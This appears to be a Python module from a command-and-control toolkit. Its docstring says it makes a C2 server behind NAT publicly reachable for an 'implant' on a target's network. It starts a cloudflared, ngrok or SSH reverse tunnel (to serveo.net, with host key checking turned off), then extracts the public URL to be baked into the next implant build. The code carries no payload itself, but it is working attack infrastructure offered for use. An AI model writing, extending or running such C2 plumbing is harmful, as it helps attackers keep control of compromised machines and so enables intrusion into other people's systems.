"""Public reachability for a C2 behind NAT: cloudflared, ngrok or SSH reverse.

The implant only needs one URL that resolves from the target's network. These
helpers find a tunnel binary, start it and print the public URL to bake into the
next build. Nothing is uploaded anywhere; the tunnel just forwards a port.
"""
from __future__ import annotations

import re
import shutil
import subprocess
import time
from typing import Optional

URL_PATTERNS = {
    "cloudflared": re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com"),
    "ngrok": re.compile(r"https://[a-z0-9-]+\.(?:ngrok-free\.app|ngrok\.app|ngrok\.io)"),
}


def find(provider: str) -> Optional[str]:
    return shutil.which(provider)


def start_cloudflared(port: int) -> Optional[str]:
    binary = find("cloudflared")
    if not binary:
        return None
    proc = subprocess.Popen(
        [binary, "tunnel", "--url", f"http://127.0.0.1:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )
    deadline = time.time() + 30
    while time.time() < deadline:
        line = proc.stdout.readline() if proc.stdout else ""
        if not line:
            if proc.poll() is not None:
                return None
            continue
        match = URL_PATTERNS["cloudflared"].search(line)
        if match:
            print(f"  tunnel      {match.group(0)}  (pid {proc.pid})")
            return match.group(0)
    proc.terminate()
    return None


def start_ngrok(port: int, auth_token: str = "") -> Optional[str]:
    binary = find("ngrok")
    if not binary:
        return None
    args = [binary, "http", str(port), "--log", "stdout"]
    if auth_token:
        args += ["--authtoken", auth_token]
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    deadline = time.time() + 30
    while time.time() < deadline:
        line = proc.stdout.readline() if proc.stdout else ""
        match = URL_PATTERNS["ngrok"].search(line)
        if match:
            print(f"  tunnel      {match.group(0)}  (pid {proc.pid})")
            return match.group(0)
        if proc.poll() is not None:
            return None
    proc.terminate()
    return None


def start_ssh(port: int, host: str = "serveo.net") -> Optional[str]:
    binary = find("ssh")
    if not binary:
        return None
    remote = f"https://{host}"
    proc = subprocess.Popen(
        [binary, "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", host],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )
    print(f"  tunnel      {remote}  (pid {proc.pid}) — forward 80 → {port}")
    return remote


def start(port: int, provider: str = "auto") -> Optional[str]:
    if provider == "auto":
        for candidate in ("cloudflared", "ngrok", "ssh"):
            if find(candidate):
                provider = candidate
                break
    if provider == "cloudflared":
        return start_cloudflared(port)
    if provider == "ngrok":
        return start_ngrok(port)
    if provider == "ssh":
        return start_ssh(port)
    print("  no tunnel binary found (looked for cloudflared, ngrok, ssh)")
    return None


def status() -> str:
    found = [name for name in ("cloudflared", "ngrok", "ssh") if find(name)]
    return ", ".join(found) if found else "none"